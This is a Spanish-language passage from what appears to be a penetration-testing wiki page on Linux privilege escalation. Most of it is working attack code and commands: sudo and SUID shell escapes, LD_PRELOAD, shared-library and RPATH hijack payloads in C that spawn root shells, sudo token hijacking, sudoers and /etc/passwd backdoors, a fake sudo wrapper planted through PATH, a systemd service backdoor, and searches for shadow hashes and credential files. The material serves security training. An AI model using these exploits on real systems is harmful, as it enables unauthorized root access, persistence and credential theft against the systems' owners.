(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Verifique si puede husmear el tráfico. Si puede, podría ser capaz de obtener algunas credenciales.
```
timeout 1 tcpdump
```
## Usuarios

### Enumeración Genérica

Verifique **quién** es usted, qué **privilegios** tiene, qué **usuarios** están en los sistemas, cuáles pueden **iniciar sesión** y cuáles tienen **privilegios de root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Gran UID

Algunas versiones de Linux se vieron afectadas por un error que permite a los usuarios con **UID > INT\_MAX** escalar privilegios. Más información: [aquí](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aquí](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) y [aquí](https://twitter.com/paragonsec/status/1071152249529884674).\
**Explotarlo** usando: **`systemd-run -t /bin/bash`**

### Grupos

Verifique si es **miembro de algún grupo** que podría otorgarle privilegios de root:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Portapapeles

Verifique si hay algo interesante dentro del portapapeles (si es posible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Contraseñas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Contraseñas conocidas

Si **conoces alguna contraseña** del entorno, **intenta iniciar sesión como cada usuario** utilizando la contraseña.

### Su Brute

Si no te importa hacer mucho ruido y los binarios `su` y `timeout` están presentes en la computadora, puedes intentar forzar el usuario usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta forzar usuarios.

## Abusos de PATH con permisos de escritura

### $PATH

Si descubres que puedes **escribir dentro de alguna carpeta del $PATH**, es posible que puedas escalar privilegios al **crear una puerta trasera dentro de la carpeta escribible** con el nombre de algún comando que vaya a ser ejecutado por un usuario diferente (idealmente root) y que **no se cargue desde una carpeta que esté ubicada antes** de tu carpeta escribible en $PATH.

### SUDO y SUID

Podrías tener permiso para ejecutar algún comando usando sudo o podrían tener el bit suid. Verifícalo usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Algunos **comandos inesperados te permiten leer y/o escribir archivos o incluso ejecutar un comando.** Por ejemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuración de Sudo podría permitir a un usuario ejecutar algún comando con los privilegios de otro usuario sin necesidad de conocer la contraseña.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
En este ejemplo, el usuario `demo` puede ejecutar `vim` como `root`, ahora es trivial obtener una shell agregando una clave ssh en el directorio raíz o llamando a `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta directiva permite al usuario **establecer una variable de entorno** mientras ejecuta algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este ejemplo, **basado en la máquina HTB Admirer**, era **vulnerable** al **secuestro de PYTHONPATH** para cargar una biblioteca de Python arbitraria mientras se ejecuta el script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Bypass de ejecución de Sudo evitando rutas

**Salta** para leer otros archivos o usar **enlaces simbólicos**. Por ejemplo en el archivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si se utiliza un **comodín** (\*), es aún más fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/binario SUID sin ruta de comando

Si se otorga el **permiso sudo** a un solo comando **sin especificar la ruta**: _hacker10 ALL= (root) less_, se puede explotar cambiando la variable PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica también se puede utilizar si un binario **suid** **ejecuta otro comando sin especificar la ruta (siempre verificar con** _**strings**_ **el contenido de un binario SUID sospechoso)**.

[Ejemplos de carga útil para ejecutar.](payloads-to-execute.md)

### Binario SUID con ruta de comando

Si el **binario suid** **ejecuta otro comando especificando la ruta**, entonces puedes intentar **exportar una función** con el nombre del comando que el archivo suid está llamando.

Por ejemplo, si un binario suid llama a _**/usr/sbin/service apache2 start**_ debes intentar crear la función y exportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

La variable de entorno **LD\_PRELOAD** se utiliza para especificar una o más bibliotecas compartidas (.so files) que serán cargadas por el cargador antes que todas las demás, incluida la biblioteca C estándar (`libc.so`). Este proceso se conoce como precargar una biblioteca.

Sin embargo, para mantener la seguridad del sistema y evitar que esta característica sea explotada, especialmente con ejecutables **suid/sgid**, el sistema impone ciertas condiciones:

- El cargador ignora **LD\_PRELOAD** para ejecutables donde el ID de usuario real (_ruid_) no coincide con el ID de usuario efectivo (_euid_).
- Para ejecutables con suid/sgid, solo se precargan bibliotecas en rutas estándar que también son suid/sgid.

La escalada de privilegios puede ocurrir si tienes la capacidad de ejecutar comandos con `sudo` y la salida de `sudo -l` incluye la declaración **env\_keep+=LD\_PRELOAD**. Esta configuración permite que la variable de entorno **LD\_PRELOAD** persista y sea reconocida incluso cuando se ejecutan comandos con `sudo`, lo que potencialmente puede llevar a la ejecución de código arbitrario con privilegios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
Guardar como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Luego **compílalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **elevar privilegios** ejecutando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Un privesc similar puede ser abusado si el atacante controla la variable de entorno **LD\_LIBRARY\_PATH** porque controla la ruta donde se buscarán las bibliotecas.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binario SUID - Inyección de .so

Cuando te encuentres con un binario con permisos **SUID** que parezca inusual, es una buena práctica verificar si está cargando archivos **.so** correctamente. Esto se puede comprobar ejecutando el siguiente comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por ejemplo, encontrarse con un error como _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)"_ sugiere un potencial para explotación.

Para explotar esto, se procedería creando un archivo C, digamos _"/path/to/.config/libcalc.c"_, que contenga el siguiente código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, una vez compilado y ejecutado, tiene como objetivo elevar privilegios manipulando los permisos de archivo y ejecutando un shell con privilegios elevados.

Compila el archivo C anterior en un archivo de objeto compartido (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, ejecutar el binario SUID afectado debería activar el exploit, permitiendo una posible compromisión del sistema.

## Secuestro de Objetos Compartidos
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ahora que hemos encontrado un binario SUID que carga una biblioteca desde una carpeta donde podemos escribir, creemos la biblioteca en esa carpeta con el nombre necesario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si recibes un error como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Esto significa que la biblioteca que has generado debe tener una función llamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) es una lista seleccionada de binarios Unix que pueden ser explotados por un atacante para evadir restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo pero para casos en los que solo puedes **inyectar argumentos** en un comando.

El proyecto recopila funciones legítimas de binarios Unix que pueden ser abusadas para escapar de shells restringidos, escalar o mantener privilegios elevados, transferir archivos, generar shells de conexión y reversa, y facilitar otras tareas de post-explotación.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Si puedes acceder a `sudo -l`, puedes usar la herramienta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar si encuentra cómo explotar alguna regla de sudo.

### Reutilización de Tokens de Sudo

En casos donde tienes **acceso sudo** pero no la contraseña, puedes escalar privilegios **esperando la ejecución de un comando sudo y luego secuestrando el token de sesión**.

Requisitos para escalar privilegios:

* Ya tienes un shell como usuario "_sampleuser_"
* "_sampleuser_" ha **usado `sudo`** para ejecutar algo en los **últimos 15 minutos** (por defecto, esa es la duración del token de sudo que nos permite usar `sudo` sin introducir ninguna contraseña)
* `cat /proc/sys/kernel/yama/ptrace_scope` es 0
* `gdb` es accesible (puedes subirlo)

(Puedes habilitar temporalmente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificar permanentemente `/etc/sysctl.d/10-ptrace.conf` y establecer `kernel.yama.ptrace_scope = 0`)

Si se cumplen todos estos requisitos, **puedes escalar privilegios usando:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* El **primer exploit** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes usarlo para **activar el token de sudo en tu sesión** (no obtendrás automáticamente un shell de root, haz `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* El **segundo exploit** (`exploit_v2.sh`) creará una shell sh en _/tmp_ **propiedad de root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* El **tercer exploit** (`exploit_v3.sh`) **creará un archivo sudoers** que hace que **los tokens de sudo sean eternos y permite que todos los usuarios usen sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Nombre de usuario>

Si tienes **permisos de escritura** en la carpeta o en cualquiera de los archivos creados dentro de la carpeta, puedes usar el binario [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) para **crear un token de sudo para un usuario y PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes una shell como ese usuario con PID 1234, puedes **obtener privilegios de sudo** sin necesidad de conocer la contraseña haciendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. Estos archivos **por defecto solo pueden ser leídos por el usuario root y el grupo root**.\
**Si** puedes **leer** este archivo podrías ser capaz de **obtener información interesante**, y si puedes **escribir** en cualquier archivo podrás **escalar privilegios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si puedes escribir, puedes abusar de este permiso.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Otra forma de abusar de estos permisos:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Existen algunas alternativas al binario `sudo` como `doas` para OpenBSD, recuerda verificar su configuración en `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Secuestro de Sudo

Si sabes que un **usuario suele conectarse a una máquina y usar `sudo`** para escalar privilegios y obtuviste una shell dentro del contexto de ese usuario, puedes **crear un nuevo ejecutable de sudo** que ejecutará tu código como root y luego el comando del usuario. Luego, **modifica el $PATH** del contexto de usuario (por ejemplo, agregando la nueva ruta en .bash\_profile) para que cuando el usuario ejecute sudo, se ejecute tu ejecutable de sudo.

Ten en cuenta que si el usuario utiliza un shell diferente (no bash), deberás modificar otros archivos para agregar la nueva ruta. Por ejemplo, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

O ejecutando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteca Compartida

### ld.so

El archivo `/etc/ld.so.conf` indica **de dónde se cargan los archivos de configuración**. Normalmente, este archivo contiene la siguiente ruta: `include /etc/ld.so.conf.d/*.conf`

Esto significa que se leerán los archivos de configuración de `/etc/ld.so.conf.d/*.conf`. Estos archivos de configuración **apuntan a otras carpetas** donde se buscarán **bibliotecas**. Por ejemplo, el contenido de `/etc/ld.so.conf.d/libc.conf` es `/usr/local/lib`. **Esto significa que el sistema buscará bibliotecas dentro de `/usr/local/lib`**.

Si por alguna razón **un usuario tiene permisos de escritura** en alguna de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta dentro del archivo de configuración dentro de `/etc/ld.so.conf.d/*.conf`, podría ser capaz de escalar privilegios.\
Echa un vistazo a **cómo explotar esta mala configuración** en la siguiente página:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Al copiar la librería en `/var/tmp/flag15/` será utilizada por el programa en este lugar como se especifica en la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Luego crea una biblioteca maliciosa en `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacidades

Las capacidades de Linux proporcionan un **subconjunto de los privilegios de root disponibles a un proceso**. Esto divide efectivamente los **privilegios de root en unidades más pequeñas y distintivas**. Cada una de estas unidades puede ser otorgada independientemente a los procesos. De esta manera, el conjunto completo de privilegios se reduce, disminuyendo los riesgos de explotación.\
Lee la siguiente página para **aprender más sobre las capacidades y cómo abusar de ellas**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Permisos de directorio

En un directorio, el **bit de "ejecución"** implica que el usuario afectado puede hacer "**cd**" en la carpeta.\
El bit de **"lectura"** implica que el usuario puede **listar** los **archivos**, y el bit de **"escritura"** implica que el usuario puede **eliminar** y **crear** nuevos **archivos**.

## ACLs

Las Listas de Control de Acceso (ACLs) representan la capa secundaria de permisos discrecionales, capaces de **anular los permisos tradicionales ugo/rwx**. Estos permisos mejoran el control sobre el acceso a archivos o directorios al permitir o denegar derechos a usuarios específicos que no son los propietarios ni forman parte del grupo. Este nivel de **granularidad garantiza una gestión de acceso más precisa**. Se pueden encontrar más detalles [**aquí**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Otorga** al usuario "kali" permisos de lectura y escritura sobre un archivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtener** archivos con ACL específicos del sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sesiones de shell abiertas

En versiones **antiguas** puedes **secuestrar** alguna sesión de **shell** de un usuario diferente (**root**).\
En las **versiones más recientes** solo podrás **conectarte** a sesiones de pantalla de **tu propio usuario**. Sin embargo, podrías encontrar **información interesante dentro de la sesión**.

### Secuestro de sesiones de pantalla

**Listar sesiones de pantalla**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**Adjuntar a una sesión**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Secuestro de sesiones de tmux

Este era un problema con las **versiones antiguas de tmux**. No pude secuestrar una sesión de tmux (v2.1) creada por root como un usuario no privilegiado.

**Listar sesiones de tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Adjuntar a una sesión**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Verifique **Valentine box from HTB** para un ejemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Todas las claves SSL y SSH generadas en sistemas basados en Debian (Ubuntu, Kubuntu, etc) entre septiembre de 2006 y el 13 de mayo de 2008 pueden verse afectadas por este error.\
Este error se produce al crear una nueva clave ssh en esos sistemas operativos, ya que **solo eran posibles 32,768 variaciones**. Esto significa que todas las posibilidades pueden ser calculadas y **teniendo la clave pública ssh puedes buscar la clave privada correspondiente**. Puedes encontrar las posibilidades calculadas aquí: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valores de configuración interesantes de SSH

* **PasswordAuthentication:** Especifica si se permite la autenticación por contraseña. El valor predeterminado es `no`.
* **PubkeyAuthentication:** Especifica si se permite la autenticación por clave pública. El valor predeterminado es `yes`.
* **PermitEmptyPasswords**: Cuando se permite la autenticación por contraseña, especifica si el servidor permite el inicio de sesión en cuentas con cadenas de contraseña vacías. El valor predeterminado es `no`.

### PermitRootLogin

Especifica si el usuario root puede iniciar sesión usando ssh, el valor predeterminado es `no`. Los valores posibles son:

* `yes`: root puede iniciar sesión usando contraseña y clave privada
* `without-password` o `prohibit-password`: root solo puede iniciar sesión con una clave privada
* `forced-commands-only`: Root solo puede iniciar sesión usando una clave privada y si se especifican las opciones de comandos
* `no` : no

### AuthorizedKeysFile

Especifica los archivos que contienen las claves públicas que se pueden utilizar para la autenticación de usuario. Puede contener tokens como `%h`, que serán reemplazados por el directorio principal. **Puedes indicar rutas absolutas** (comenzando en `/`) o **rutas relativas desde el directorio principal del usuario**. Por ejemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Esa configuración indicará que si intentas iniciar sesión con la **clave privada** del usuario "**testusername**" ssh va a comparar la clave pública de tu clave con las que se encuentran en `/home/testusername/.ssh/authorized_keys` y `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

El reenvío del agente SSH te permite **utilizar tus claves SSH locales en lugar de dejar claves** (¡sin frases de paso!) en tu servidor. Así, podrás **saltar** a través de ssh **a un host** y desde allí **saltar a otro** host **utilizando** la **clave** ubicada en tu **host inicial**.

Necesitas configurar esta opción en `$HOME/.ssh.config` de la siguiente manera:
```
Host example.com
ForwardAgent yes
```
Ten en cuenta que si `Host` es `*`, cada vez que el usuario salte a una máquina diferente, esa máquina podrá acceder a las claves (lo cual es un problema de seguridad).

El archivo `/etc/ssh_config` puede **anular** estas **opciones** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **permitir** o **denegar** el reenvío del agente SSH con la palabra clave `AllowAgentForwarding` (por defecto es permitido).

Si descubres que el Agente Forward está configurado en un entorno, lee la siguiente página, ya que **podrías aprovecharlo para escalar privilegios**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Archivos Interesantes

### Archivos de Perfiles

El archivo `/etc/profile` y los archivos en `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario inicia un nuevo shell**. Por lo tanto, si puedes **escribir o modificar alguno de ellos, podrías escalar privilegios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
### Archivos Passwd/Shadow

Dependiendo del sistema operativo, es posible que los archivos `/etc/passwd` y `/etc/shadow` tengan un nombre diferente o que exista una copia de seguridad. Por lo tanto, se recomienda **encontrar todos ellos** y **verificar si puedes leer** para ver **si hay hashes** dentro de los archivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
En algunas ocasiones puedes encontrar **hashes de contraseñas** dentro del archivo `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd con permisos de escritura

Primero, genera una contraseña con uno de los siguientes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Luego, añade el usuario `hacker` y agrega la contraseña generada.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Por ejemplo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ahora puedes usar el comando `su` con `hacker:hacker`

Alternativamente, puedes usar las siguientes líneas para agregar un usuario ficticio sin contraseña.\
ADVERTENCIA: podrías degradar la seguridad actual de la máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**NOTA:** En las plataformas BSD, `/etc/passwd` se encuentra en `/etc/pwd.db` y `/etc/master.passwd`, además, `/etc/shadow` se renombra a `/etc/spwd.db`.

Debes verificar si puedes **escribir en algunos archivos sensibles**. Por ejemplo, ¿puedes escribir en algún **archivo de configuración de servicio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por ejemplo, si la máquina está ejecutando un servidor **tomcat** y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/**, entonces puedes modificar las líneas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Tu puerta trasera se ejecutará la próxima vez que se inicie tomcat.

### Verificar Carpetas

Las siguientes carpetas pueden contener copias de seguridad o información interesante: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablemente no podrás leer la última, pero inténtalo)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ubicación/archivos de propiedad extraña
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Archivos modificados en los últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Archivos de base de datos Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### Archivos \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Archivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binarios en la RUTA (PATH)**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Archivos web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Copias de seguridad**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Archivos conocidos que contienen contraseñas

Lee el código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), busca **varios archivos posibles que podrían contener contraseñas**.\
**Otra herramienta interesante** que puedes usar para hacerlo es: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) que es una aplicación de código abierto utilizada para recuperar muchas contraseñas almacenadas en una computadora local para Windows, Linux y Mac.

### Registros

Si puedes leer registros, es posible que puedas encontrar **información interesante/confidencial dentro de ellos**. Cuanto más extraño sea el registro, más interesante será (probablemente).\
Además, algunos registros de auditoría "**mal**" configurados (¿con puerta trasera?) pueden permitirte **grabar contraseñas** dentro de los registros de auditoría como se explica en este artículo: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **leer registros del grupo** [**adm**](grupos-interesantes-linux-pe/#grupo-adm) será de gran ayuda.

### Archivos de shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
